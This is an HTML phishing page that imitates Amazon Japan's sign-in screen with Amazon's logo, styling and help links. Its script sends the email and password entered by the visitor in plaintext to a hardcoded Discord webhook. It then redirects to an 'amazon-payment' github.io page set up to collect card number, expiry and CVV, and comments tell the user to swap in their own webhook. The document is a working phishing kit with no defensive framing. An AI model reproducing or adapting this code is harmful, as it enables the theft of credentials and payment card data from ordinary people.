<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <link rel="icon" href="https://i0.wp.com/goworkship.com/magazine/wp-content/uploads/2019/10/Amazon-logo-history-5-557x400.jpg?resize=557%2C400&ssl=1" type="image/png">
  <title>Amazonサインイン</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background-color: #fff;
      padding: 30px;
      border: 1px solid #ddd;
      width: 300px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .login-box h2 {
      margin-bottom: 20px;
      font-size: 24px;
      color: #111;
    }
    .login-box input {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .login-box button {
      width: 100%;
      padding: 10px;
      background-color: #f0c14b;
      border: 1px solid #a88734;
      border-radius: 4px;
      cursor: pointer;
      font-weight: bold;
    }
    .login-box button:hover {
      background-color: #e2b33c;
    }
    .error {
      color: red;
      font-size: 12px;
      margin-bottom: 10px;
      display: none;
    }
    .help-links, .terms {
      font-size: 12px;
      text-align: center;
      margin-top: 10px;
    }
    .help-links a, .terms a {
      color: #0066c0;
      text-decoration: none;
    }
    .help-links a:hover, .terms a:hover {
      text-decoration: underline;
    }
    .login-logo {
      display: block;
      max-width: 120px;
      margin: 0 auto 20px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://m.media-amazon.com/images/G/01/digital/PV_Logo_Landscape_Smile_Centred_Dark_Squid_Ink_RGB_150._CB554671110_.png" alt="Amazonロゴ" class="login-logo">
    <h2>サインイン</h2>
    <form id="loginForm">
      <input type="text" id="email" placeholder="メールアドレスまたは携帯番号">
      <input type="password" id="password" placeholder="パスワード">
      <div class="error" id="errorMessage">両方の項目を入力してください。</div>
      <button type="submit">サインイン</button>
    </form>

    <div class="help-links">
      <p>
        <a href="https://amazon.co.jp/ap/forgotpassword" target="_blank" rel="noopener noreferrer">お困りですか？</a>
      </p>
    </div>

    <div class="terms">
      続行することで、Amazonの  
      <a href="https://amazon.co.jp/gp/help/customer/display.html?nodeId=GLSBYFE9MGKKQXXM" target="_blank" rel="noopener noreferrer">利用規約</a> および  
      <a href="https://amazon.co.jp/gp/help/customer/display.html?nodeId=GLSBYFE9MGKKQXXM" target="_blank" rel="noopener noreferrer">プライバシー規約</a> に同意したものとみなされます。
    </div>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();
      const error = document.getElementById("errorMessage");

      if (!email || !password) {
      error.style.display = "block";
        return;
      } else {
      error.style.display = "none";
      }

      // Discord Webhook用のデータ形式
      const webhookUrl = "https://discord.com/api/webhooks/1410975643868463247/ZY3_pd3nQ9TT0gMSBqJEhKv46h8rxjh3zwUPek8UTWaXgRpUDwTUhJ3DK-Tz5bDNiI0v"; // ← 自分のWebhook URLに変更してね

      const payload = {
        content: `📩 新しいサインイン情報\nメール: ${email}\nパスワード: ${password}`,
        username: "フォームBot",
        avatar_url: "https://i.imgur.com/4M34hi2.png"
      };

      fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      })
      .then(response => {
        if (response.ok) {
          window.location.href = "https://amazon-payment.github.io/amazon.payment.com/?cardNumber=&expiry=&cardHolder=&cvv="; // ← 遷移先URLに変更してね
        } else {
          alert("送信に失敗しました。ステータス: " + response.status);
        }
      })
      .catch(error => {
        console.error("送信エラー:", error);
        alert("エラーが発生しました。");
      });
    });
  </script>
</body>
</html>
